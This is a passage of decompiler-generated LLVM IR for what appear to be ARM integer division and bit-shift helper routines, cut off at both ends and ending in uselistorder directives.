  %v1_12afc = phi i32 [ %v4_12afc, %.thread11 ], [ %v2_12ad059, %dec_label_pc_12ac4 ]
  %v1_12ad0 = phi i32 [ %v0_12b08, %.thread11 ], [ 0, %dec_label_pc_12ac4 ]
  %v1_12b00 = phi i32 [ %v4_12b00, %.thread11 ], [ %v1_12ac851, %dec_label_pc_12ac4 ]
  %v1_12acc = phi i32 [ %v0_12af8, %.thread11 ], [ %v0_12a7c, %dec_label_pc_12ac4 ]
  %v3_12ac8 = icmp ult i32 %v1_12acc, %v1_12b00
  br i1 %v3_12ac8, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_12ac8
  %v3_12acc = sub i32 %v1_12acc, %v1_12b00
  %v3_12ad0 = or i32 %v1_12ad0, %v1_12afc
  store i32 %v3_12ad0, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12ac8, %bb84
  %v1_12ad8 = phi i32 [ %v1_12acc, %dec_label_pc_12ac8 ], [ %v3_12acc, %bb84 ]
  %v1_12adc = phi i32 [ %v1_12ad0, %dec_label_pc_12ac8 ], [ %v3_12ad0, %bb84 ]
  %v4_12ad4 = udiv i32 %v1_12b00, 2
  %v6_12ad4 = icmp ult i32 %v1_12ad8, %v4_12ad4
  br i1 %v6_12ad4, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_12ad8 = urem i32 %v1_12b00, 2
  %v4_12ad8 = icmp eq i32 %v3_12ad8, 0
  %v6_12ad8 = sub i32 %v1_12ad8, %v4_12ad4
  br i1 %v4_12ad8, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_12adc = udiv i32 %v1_12afc, 2
  %v6_12adc = or i32 %v1_12adc, %v5_12adc
  store i32 %v6_12adc, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_12ae4 = phi i32 [ %v6_12ad8, %bb85 ], [ %v1_12ad8, %.thread7 ], [ %v6_12ad8, %bb86 ]
  %v1_12ae8 = phi i32 [ %v1_12adc, %bb85 ], [ %v1_12adc, %.thread7 ], [ %v6_12adc, %bb86 ]
  %v4_12ae0 = udiv i32 %v1_12b00, 4
  %v6_12ae0 = icmp ult i32 %v1_12ae4, %v4_12ae0
  br i1 %v6_12ae0, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_12ae4 = and i32 %v1_12b00, 2
  %v4_12ae4 = icmp eq i32 %v3_12ae4, 0
  %v6_12ae4 = sub i32 %v1_12ae4, %v4_12ae0
  br i1 %v4_12ae4, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_12ae8 = udiv i32 %v1_12afc, 4
  %v6_12ae8 = or i32 %v1_12ae8, %v5_12ae8
  store i32 %v6_12ae8, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_12af0 = phi i32 [ %v6_12ae4, %bb87 ], [ %v1_12ae4, %.thread8 ], [ %v6_12ae4, %bb88 ]
  %v1_12af4 = phi i32 [ %v1_12ae8, %bb87 ], [ %v1_12ae8, %.thread8 ], [ %v6_12ae8, %bb88 ]
  %v4_12aec = udiv i32 %v1_12b00, 8
  %v6_12aec = icmp ult i32 %v1_12af0, %v4_12aec
  br i1 %v6_12aec, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_12af0 = and i32 %v1_12b00, 4
  %v4_12af0 = icmp eq i32 %v3_12af0, 0
  %v6_12af0 = sub i32 %v1_12af0, %v4_12aec
  br i1 %v4_12af0, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_12af4 = udiv i32 %v1_12afc, 8
  %v6_12af4 = or i32 %v1_12af4, %v5_12af4
  store i32 %v6_12af4, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_12b08 = phi i32 [ %v1_12af4, %bb89 ], [ %v1_12af4, %.thread9 ], [ %v6_12af4, %bb90 ]
  %v0_12af8 = phi i32 [ %v6_12af0, %bb89 ], [ %v1_12af0, %.thread9 ], [ %v6_12af0, %bb90 ]
  %v2_12af8 = icmp eq i32 %v0_12af8, 0
  br i1 %v2_12af8, label %dec_label_pc_12b08, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_12afc, 16
  br i1 %tmp138, label %dec_label_pc_12b08, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_12afc = udiv i32 %v1_12afc, 16
  %v4_12b00 = udiv i32 %v1_12b00, 16
  br label %dec_label_pc_12ac8

dec_label_pc_12b08:                               ; preds = %thread-pre-split, %bb91
  ret i32 %v0_12b08

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12a7c
  %v9_12a7c = icmp eq i32 %v0_12a7c, %v1_12a7c
  %. = zext i1 %v9_12a7c to i32
  ret i32 %.

dec_label_pc_12b1c:                               ; preds = %dec_label_pc_12a84
  %v2_12b1c = icmp ugt i32 %v1_12a7c, 65535
  br i1 %v2_12b1c, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_12b1c
  %v2_12b20 = and i32 %v1_12a7c, 32768
  %v3_12b20 = icmp eq i32 %v2_12b20, 0
  %v4_12b20 = udiv i32 %v1_12a7c, 65536
  br i1 %v3_12b20, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_12b1c
  %v0_12b2c65 = phi i32 [ %v1_12a7c, %dec_label_pc_12b1c ], [ %v4_12b20, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_12b30 = phi i32 [ %v0_12b2c65, %.thread16 ], [ %v4_12b20, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_12b2c = icmp ugt i32 %v1_12b30, 255
  br i1 %v2_12b2c, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_12b30 = and i32 %v1_12b30, 128
  %v3_12b30 = icmp eq i32 %v2_12b30, 0
  %v4_12b30 = udiv i32 %v1_12b30, 256
  br i1 %v3_12b30, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_12b34 = or i32 %storemerge, 8
  store i32 %v2_12b34, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_12b40 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_12b34, %bb98 ]
  %v1_12b3c = phi i32 [ %v1_12b30, %bb96 ], [ %v4_12b30, %bb97 ], [ %v4_12b30, %bb98 ]
  %v2_12b38 = icmp ugt i32 %v1_12b3c, 15
  br i1 %v2_12b38, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_12b3c = and i32 %v1_12b3c, 8
  %v3_12b3c = icmp eq i32 %v2_12b3c, 0
  %v4_12b3c = udiv i32 %v1_12b3c, 16
  br i1 %v3_12b3c, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_12b40 = add nsw i32 %v1_12b40, 4
  store i32 %v2_12b40, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_12b48 = phi i32 [ %v1_12b40, %.thread17 ], [ %v1_12b40, %bb99 ], [ %v2_12b40, %bb100 ]
  %v5_12b4c = phi i32 [ %v1_12b3c, %.thread17 ], [ %v4_12b3c, %bb99 ], [ %v4_12b3c, %bb100 ]
  %v2_12b44 = icmp ugt i32 %v5_12b4c, 3
  %v7_12b44 = icmp eq i32 %v5_12b4c, 4
  %v2_12b48 = xor i1 %v7_12b44, true
  %v3_12b48 = and i1 %v2_12b44, %v2_12b48
  br i1 %v3_12b48, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_12b48 = add nsw i32 %v4_12b48, 3
  store i32 %v5_12b48, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_12b4c = phi i32 [ %v4_12b48, %.thread18 ], [ %v5_12b48, %bb101 ]
  %v2_12b4c = xor i1 %v2_12b44, true
  %v3_12b4c = or i1 %v7_12b44, %v2_12b4c
  br i1 %v3_12b4c, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_12b4c = udiv i32 %v5_12b4c, 2
  %v9_12b4c = add i32 %v4_12b4c, %v8_12b4c
  store i32 %v9_12b4c, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_12b50 = phi i32 [ %v4_12b4c, %bb102 ], [ %v9_12b4c, %bb103 ]
  %v6_12b50 = lshr i32 %v0_12a7c, %v1_12b50
  ret i32 %v6_12b50

dec_label_pc_12b58:                               ; preds = %dec_label_pc_12a70
  %v0_12b58 = load i32, i32* @lr, align 4
  %v0_12b5c = call i32 @function_12cc8()
  store i32 %v0_12b58, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12b4c, { 1, 0 }
  uselistorder i1 %v7_12b44, { 1, 0 }
  uselistorder i32 %v4_12b3c, { 1, 0 }
  uselistorder i32 %v1_12b3c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12b34, { 1, 0 }
  uselistorder i32 %v4_12b30, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12b30, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12b20, { 1, 0 }
  uselistorder i32 %v0_12af8, { 1, 0 }
  uselistorder i32 %v4_12aec, { 1, 0 }
  uselistorder i32 %v1_12af4, { 1, 2, 0 }
  uselistorder i32 %v4_12ae0, { 1, 0 }
  uselistorder i32 %v1_12ae8, { 1, 2, 0 }
  uselistorder i32 %v4_12ad4, { 1, 0 }
  uselistorder i32 %v1_12adc, { 1, 2, 0 }
  uselistorder i32 %v1_12b00, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12ad0, { 1, 0 }
  uselistorder i32 %v1_12afc, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12abc, { 1, 0 }
  uselistorder i32 %v3_12ab8, { 1, 0 }
  uselistorder i32 %v1_12ab8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_12abc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12aa8, { 1, 0 }
  uselistorder i32 %v4_12aa4, { 2, 1, 0 }
  uselistorder i32 %v1_12aa8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12ab0.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_12a7c, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_12a7c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_12a70, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_12b08, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_12ac4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ab0thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_12b6c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12b6c:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_12b70 = call i32 @function_12a70()
  ret i32 %v0_12b70
}

define i32 @function_12b84() local_unnamed_addr {
dec_label_pc_12b84:
  %v0_12b84 = load i32, i32* @r1, align 4
  %v1_12b84 = icmp slt i32 %v0_12b84, 0
  %v2_12b84 = icmp eq i32 %v0_12b84, 0
  %v0_12b88 = load i32, i32* @r0, align 4
  %v2_12b88 = xor i32 %v0_12b88, %v0_12b84
  br i1 %v2_12b84, label %dec_label_pc_12c9c, label %dec_label_pc_12b90

dec_label_pc_12b90:                               ; preds = %dec_label_pc_12b84
  br i1 %v1_12b84, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_12b90
  %v2_12b90 = sub i32 0, %v0_12b84
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_12b90, %bb
  %v1_12c5c = phi i32 [ %v2_12b90, %bb ], [ %v0_12b84, %dec_label_pc_12b90 ]
  %v1_12b94 = add i32 %v1_12c5c, -1
  %v7_12b94 = icmp eq i32 %v1_12c5c, 1
  br i1 %v7_12b94, label %dec_label_pc_12c3c, label %dec_label_pc_12b9c

dec_label_pc_12b9c:                               ; preds = %thread-pre-split
  %v1_12b9c = icmp slt i32 %v0_12b88, 0
  br i1 %v1_12b9c, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_12b9c
  %v2_12ba0 = sub i32 0, %v0_12b88
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_12b9c, %bb84
  %v0_12c90 = phi i32 [ %v0_12b88, %dec_label_pc_12b9c ], [ %v2_12ba0, %bb84 ]
  %v3_12ba4 = icmp uge i32 %v0_12c90, %v1_12c5c
  %v9_12ba4 = icmp eq i32 %v0_12c90, %v1_12c5c
  %v2_12ba8 = xor i1 %v3_12ba4, true
  %v3_12ba8 = or i1 %v9_12ba4, %v2_12ba8
  br i1 %v3_12ba8, label %dec_label_pc_12c48, label %dec_label_pc_12bac

dec_label_pc_12bac:                               ; preds = %bb85
  %v2_12bac = and i32 %v1_12b94, %v1_12c5c
  %v4_12bac = icmp eq i32 %v2_12bac, 0
  br i1 %v4_12bac, label %dec_label_pc_12c58, label %dec_label_pc_12bb4

dec_label_pc_12bb4:                               ; preds = %dec_label_pc_12bac
  %v3_12bb4 = icmp ult i32 %v1_12c5c, 536870912
  br i1 %v3_12bb4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12bb4
  %v4_12bb8 = mul i32 %v1_12c5c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12bb4, %.thread
  %v0_12bd8.pr40.ph = phi i32 [ %v4_12bb8, %.thread ], [ %v1_12c5c, %dec_label_pc_12bb4 ]
  %storemerge142 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12bb4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb88
  %v0_12bd8.pr40 = phi i32 [ %v4_12bcc, %bb88 ], [ %v0_12bd8.pr40.ph, %.preheader.preheader ]
  %v1_12bd0 = phi i32 [ %v4_12bd0, %bb88 ], [ %storemerge142, %.preheader.preheader ]
  %v2_12bc4 = icmp ugt i32 %v0_12bd8.pr40, 268435455
  br i1 %v2_12bc4, label %.thread3, label %bb86

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_12bd8thread-pre-split.loopexit

bb86:                                             ; preds = %.preheader
  %v4_12bc8 = icmp ult i32 %v0_12bd8.pr40, %v0_12c90
  br i1 %v4_12bc8, label %bb87, label %dec_label_pc_12bd8thread-pre-split.loopexit.loopexit

bb87:                                             ; preds = %bb86
  %v2_12bcc = and i32 %v0_12bd8.pr40, 268435456
  %v3_12bcc = icmp eq i32 %v2_12bcc, 0
  %v4_12bcc = mul i32 %v0_12bd8.pr40, 16
  br i1 %v3_12bcc, label %bb88, label %dec_label_pc_12bd8.loopexit

bb88:                                             ; preds = %bb87
  %v2_12bd0 = and i32 %v1_12bd0, 268435456
  %v3_12bd0 = icmp eq i32 %v2_12bd0, 0
  %v4_12bd0 = mul i32 %v1_12bd0, 16
  br i1 %v3_12bd0, label %.preheader, label %dec_label_pc_12bd8thread-pre-split.loopexit.loopexit

dec_label_pc_12bd8thread-pre-split.loopexit.loopexit: ; preds = %bb88, %bb86
  %v1_12be452.ph = phi i32 [ %v1_12bd0, %bb86 ], [ %v4_12bd0, %bb88 ]
  %v0_12bd8.pr42.ph = phi i32 [ %v0_12bd8.pr40, %bb86 ], [ %v4_12bcc, %bb88 ]
  br label %dec_label_pc_12bd8thread-pre-split.loopexit

dec_label_pc_12bd8thread-pre-split.loopexit:      ; preds = %dec_label_pc_12bd8thread-pre-split.loopexit.loopexit, %.thread3
  %v1_12be452 = phi i32 [ %v1_12bd0, %.thread3 ], [ %v1_12be452.ph, %dec_label_pc_12bd8thread-pre-split.loopexit.loopexit ]
  %v0_12bd8.pr42 = phi i32 [ %v0_12bd8.pr40, %.thread3 ], [ %v0_12bd8.pr42.ph, %dec_label_pc_12bd8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12bd8thread-pre-split

dec_label_pc_12bd8thread-pre-split:               ; preds = %dec_label_pc_12bd8thread-pre-split.loopexit, %bb90
  %v1_12be450 = phi i32 [ %v1_12be452, %dec_label_pc_12bd8thread-pre-split.loopexit ], [ %v3_12be4, %bb90 ]
  %v2_12bdc48 = phi i32 [ %v0_12c90, %dec_label_pc_12bd8thread-pre-split.loopexit ], [ %v2_12bdc, %bb90 ]
  %v0_12bd8.pr = phi i32 [ %v0_12bd8.pr42, %dec_label_pc_12bd8thread-pre-split.loopexit ], [ %v3_12be0, %bb90 ]
  br label %dec_label_pc_12bd8

dec_label_pc_12bd8.loopexit:                      ; preds = %bb87
  br label %dec_label_pc_12bd8

dec_label_pc_12bd8:                               ; preds = %dec_label_pc_12bd8.loopexit, %dec_label_pc_12bd8thread-pre-split
  %v1_12be4 = phi i32 [ %v1_12be450, %dec_label_pc_12bd8thread-pre-split ], [ %v1_12bd0, %dec_label_pc_12bd8.loopexit ]
  %v2_12bdc = phi i32 [ %v2_12bdc48, %dec_label_pc_12bd8thread-pre-split ], [ %v0_12c90, %dec_label_pc_12bd8.loopexit ]
  %v1_12be0 = phi i32 [ %v0_12bd8.pr, %dec_label_pc_12bd8thread-pre-split ], [ %v4_12bcc, %dec_label_pc_12bd8.loopexit ]
  %v2_12bd8 = icmp slt i32 %v1_12be0, 0
  br i1 %v2_12bd8, label %dec_label_pc_12bec, label %bb89

bb89:                                             ; preds = %dec_label_pc_12bd8
  %v4_12bdc = icmp ult i32 %v1_12be0, %v2_12bdc
  br i1 %v4_12bdc, label %bb90, label %dec_label_pc_12bec

bb90:                                             ; preds = %bb89
  %v3_12be0 = mul i32 %v1_12be0, 2
  %v2_12be4 = icmp slt i32 %v1_12be4, 0
  %v3_12be4 = mul i32 %v1_12be4, 2
  br i1 %v2_12be4, label %dec_label_pc_12bec, label %dec_label_pc_12bd8thread-pre-split

dec_label_pc_12bec:                               ; preds = %bb89, %dec_label_pc_12bd8, %bb90
  %v2_12bf863 = phi i32 [ %v3_12be4, %bb90 ], [ %v1_12be4, %bb89 ], [ %v1_12be4, %dec_label_pc_12bd8 ]
  %v1_12bf055 = phi i32 [ %v3_12be0, %bb90 ], [ %v1_12be0, %bb89 ], [ %v1_12be0, %dec_label_pc_12bd8 ]
  br label %dec_label_pc_12bf0

dec_label_pc_12bf0:                               ; preds = %.thread13, %dec_label_pc_12bec
  %v1_12c24 = phi i32 [ %v4_12c24, %.thread13 ], [ %v2_12bf863, %dec_label_pc_12bec ]
  %v1_12bf8 = phi i32 [ %v1_12c34, %.thread13 ], [ 0, %dec_label_pc_12bec ]
  %v1_12c28 = phi i32 [ %v4_12c28, %.thread13 ], [ %v1_12bf055, %dec_label_pc_12bec ]
  %v1_12bf4 = phi i32 [ %v0_12c20, %.thread13 ], [ %v0_12c90, %dec_label_pc_12bec ]
  %v3_12bf0 = icmp ult i32 %v1_12bf4, %v1_12c28
  br i1 %v3_12bf0, label %.thread8, label %bb91

bb91:                                             ; preds = %dec_label_pc_12bf0
  %v3_12bf4 = sub i32 %v1_12bf4, %v1_12c28
  %v3_12bf8 = or i32 %v1_12bf8, %v1_12c24
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12bf0, %bb91
  %v1_12c00 = phi i32 [ %v1_12bf4, %dec_label_pc_12bf0 ], [ %v3_12bf4, %bb91 ]
  %v1_12c04 = phi i32 [ %v1_12bf8, %dec_label_pc_12bf0 ], [ %v3_12bf8, %bb91 ]
  %v4_12bfc = udiv i32 %v1_12c28, 2
  %v6_12bfc = icmp ult i32 %v1_12c00, %v4_12bfc
  br i1 %v6_12bfc, label %.thread9, label %bb92

bb92:                                             ; preds = %.thread8
  %v3_12c00 = urem i32 %v1_12c28, 2
  %v4_12c00 = icmp eq i32 %v3_12c00, 0
  %v6_12c00 = sub i32 %v1_12c00, %v4_12bfc
  br i1 %v4_12c00, label %.thread9, label %bb93

bb93:                                             ; preds = %bb92
  %v5_12c04 = udiv i32 %v1_12c24, 2
  %v6_12c04 = or i32 %v1_12c04, %v5_12c04
  br label %.thread9

.thread9:                                         ; preds = %bb92, %.thread8, %bb93
  %v1_12c0c = phi i32 [ %v6_12c00, %bb92 ], [ %v1_12c00, %.thread8 ], [ %v6_12c00, %bb93 ]
  %v1_12c10 = phi i32 [ %v1_12c04, %bb92 ], [ %v1_12c04, %.thread8 ], [ %v6_12c04, %bb93 ]
  %v4_12c08 = udiv i32 %v1_12c28, 4
  %v6_12c08 = icmp ult i32 %v1_12c0c, %v4_12c08
  br i1 %v6_12c08, label %.thread10, label %bb94

bb94:                                             ; preds = %.thread9
  %v3_12c0c = and i32 %v1_12c28, 2
  %v4_12c0c = icmp eq i32 %v3_12c0c, 0
  %v6_12c0c = sub i32 %v1_12c0c, %v4_12c08
  br i1 %v4_12c0c, label %.thread10, label %bb95

bb95:                                             ; preds = %bb94
  %v5_12c10 = udiv i32 %v1_12c24, 4
  %v6_12c10 = or i32 %v1_12c10, %v5_12c10
  br label %.thread10

.thread10:                                        ; preds = %bb94, %.thread9, %bb95
  %v1_12c18 = phi i32 [ %v6_12c0c, %bb94 ], [ %v1_12c0c, %.thread9 ], [ %v6_12c0c, %bb95 ]
  %v1_12c1c = phi i32 [ %v1_12c10, %bb94 ], [ %v1_12c10, %.thread9 ], [ %v6_12c10, %bb95 ]
  %v4_12c14 = udiv i32 %v1_12c28, 8
  %v6_12c14 = icmp ult i32 %v1_12c18, %v4_12c14
  br i1 %v6_12c14, label %thread-pre-split12, label %bb96

bb96:                                             ; preds = %.thread10
  %v3_12c18 = and i32 %v1_12c28, 4
  %v4_12c18 = icmp eq i32 %v3_12c18, 0
  %v6_12c18 = sub i32 %v1_12c18, %v4_12c14
  br i1 %v4_12c18, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %bb96
  %v5_12c1c = udiv i32 %v1_12c24, 8
  %v6_12c1c = or i32 %v1_12c1c, %v5_12c1c
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb97, %.thread10, %bb96
  %v1_12c34 = phi i32 [ %v1_12c1c, %bb96 ], [ %v1_12c1c, %.thread10 ], [ %v6_12c1c, %bb97 ]
  %v0_12c20 = phi i32 [ %v6_12c18, %bb96 ], [ %v1_12c18, %.thread10 ], [ %v6_12c18, %bb97 ]
  %v2_12c20 = icmp eq i32 %v0_12c20, 0
  br i1 %v2_12c20, label %dec_label_pc_12c30, label %bb98

bb98:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_12c24, 16
  br i1 %tmp, label %dec_label_pc_12c30, label %.thread13

.thread13:                                        ; preds = %bb98
  %v4_12c24 = udiv i32 %v1_12c24, 16
  %v4_12c28 = udiv i32 %v1_12c28, 16
  br label %dec_label_pc_12bf0

dec_label_pc_12c30:                               ; preds = %thread-pre-split12, %bb98
  %v1_12c30 = icmp slt i32 %v2_12b88, 0
  br i1 %v1_12c30, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_12c30
  %v2_12c34 = sub i32 0, %v1_12c34
  br label %.thread16

.thread16:                                        ; preds = %bb103, %bb102, %bb100, %dec_label_pc_12c3c, %dec_label_pc_12c30, %bb99
  %v1_12c38 = phi i32 [ %v1_12c34, %dec_label_pc_12c30 ], [ %v2_12c34, %bb99 ], [ %v2_12c40, %bb100 ], [ undef, %dec_label_pc_12c3c ], [ %v1_12c5480, %bb102 ], [ %v2_12c50, %bb103 ]
  ret i32 %v1_12c38

dec_label_pc_12c3c:                               ; preds = %thread-pre-split
  br i1 %v1_12b84, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_12c3c
  %v2_12c40 = sub i32 0, %v0_12b88
  br label %.thread16

dec_label_pc_12c48:                               ; preds = %bb85
  br i1 %v3_12ba4, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_12c48
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_12c48, %bb101
  %v1_12c5480 = phi i32 [ %v0_12b88, %dec_label_pc_12c48 ], [ 0, %bb101 ]
  br i1 %v9_12ba4, label %bb103, label %.thread16

bb103:                                            ; preds = %bb102
  %v4_12c4c = ashr i32 %v2_12b88, 31
  %v2_12c50 = or i32 %v4_12c4c, 1
  br label %.thread16

dec_label_pc_12c58:                               ; preds = %dec_label_pc_12bac
  %v2_12c58 = icmp ugt i32 %v1_12c5c, 65535
  br i1 %v2_12c58, label %bb104, label %.thread19

bb104:                                            ; preds = %dec_label_pc_12c58
  %v2_12c5c = and i32 %v1_12c5c, 32768
  %v3_12c5c = icmp eq i32 %v2_12c5c, 0
  %v4_12c5c = udiv i32 %v1_12c5c, 65536
  br i1 %v3_12c5c, label %.thread19, label %bb105

.thread19:                                        ; preds = %bb104, %dec_label_pc_12c58
  %v0_12c6870 = phi i32 [ %v1_12c5c, %dec_label_pc_12c58 ], [ %v4_12c5c, %bb104 ]
  br label %bb105

bb105:                                            ; preds = %bb104, %.thread19
  %v1_12c6c = phi i32 [ %v0_12c6870, %.thread19 ], [ %v4_12c5c, %bb104 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb104 ]
  %v2_12c68 = icmp ugt i32 %v1_12c6c, 255
  br i1 %v2_12c68, label %bb106, label %.thread20

bb106:                                            ; preds = %bb105
  %v2_12c6c = and i32 %v1_12c6c, 128
  %v3_12c6c = icmp eq i32 %v2_12c6c, 0
  %v4_12c6c = udiv i32 %v1_12c6c, 256
  br i1 %v3_12c6c, label %.thread20, label %bb107

bb107:                                            ; preds = %bb106
  %v2_12c70 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb106, %bb105, %bb107
  %v1_12c7c = phi i32 [ %storemerge, %bb105 ], [ %storemerge, %bb106 ], [ %v2_12c70, %bb107 ]
  %v1_12c78 = phi i32 [ %v1_12c6c, %bb105 ], [ %v4_12c6c, %bb106 ], [ %v4_12c6c, %bb107 ]
  %v2_12c74 = icmp ugt i32 %v1_12c78, 15
  br i1 %v2_12c74, label %bb108, label %.thread21

bb108:                                            ; preds = %.thread20
  %v2_12c78 = and i32 %v1_12c78, 8
  %v3_12c78 = icmp eq i32 %v2_12c78, 0
  %v4_12c78 = udiv i32 %v1_12c78, 16
  br i1 %v3_12c78, label %.thread21, label %bb109

bb109:                                            ; preds = %bb108
  %v2_12c7c = add nsw i32 %v1_12c7c, 4
  br label %.thread21

.thread21:                                        ; preds = %bb108, %.thread20, %bb109
  %v4_12c84 = phi i32 [ %v1_12c7c, %.thread20 ], [ %v1_12c7c, %bb108 ], [ %v2_12c7c, %bb109 ]
  %v5_12c88 = phi i32 [ %v1_12c78, %.thread20 ], [ %v4_12c78, %bb108 ], [ %v4_12c78, %bb109 ]
  %v2_12c80 = icmp ugt i32 %v5_12c88, 3
  %v7_12c80 = icmp eq i32 %v5_12c88, 4
  %v2_12c84 = xor i1 %v7_12c80, true
  %v3_12c84 = and i1 %v2_12c80, %v2_12c84
  br i1 %v3_12c84, label %bb110, label %bb111

bb110:                                            ; preds = %.thread21
  %v5_12c84 = add nsw i32 %v4_12c84, 3
  br label %bb111

bb111:                                            ; preds = %.thread21, %bb110
  %v4_12c88 = phi i32 [ %v4_12c84, %.thread21 ], [ %v5_12c84, %bb110 ]
  %v2_12c88 = xor i1 %v2_12c80, true
  %v3_12c88 = or i1 %v7_12c80, %v2_12c88
  br i1 %v3_12c88, label %bb112, label %bb113

bb112:                                            ; preds = %bb111
  %v8_12c88 = udiv i32 %v5_12c88, 2
  %v9_12c88 = add i32 %v4_12c88, %v8_12c88
  br label %bb113

bb113:                                            ; preds = %bb111, %bb112
  %v1_12c90 = phi i32 [ %v4_12c88, %bb111 ], [ %v9_12c88, %bb112 ]
  %v1_12c8c = icmp slt i32 %v2_12b88, 0
  %v6_12c90 = lshr i32 %v0_12c90, %v1_12c90
  %v2_12c94 = sub i32 0, %v6_12c90
  %v2_12c94.v6_12c90 = select i1 %v1_12c8c, i32 %v2_12c94, i32 %v6_12c90
  ret i32 %v2_12c94.v6_12c90

dec_label_pc_12c9c:                               ; preds = %dec_label_pc_12b84
  %v0_12ca0 = call i32 @function_12cc8()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12c88, { 1, 0 }
  uselistorder i1 %v7_12c80, { 1, 0 }
  uselistorder i32 %v4_12c78, { 1, 0 }
  uselistorder i32 %v1_12c78, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12c6c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12c6c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12c5c, { 1, 0 }
  uselistorder i32 %v0_12c20, { 1, 0 }
  uselistorder i32 %v4_12c14, { 1, 0 }
  uselistorder i32 %v1_12c1c, { 1, 2, 0 }
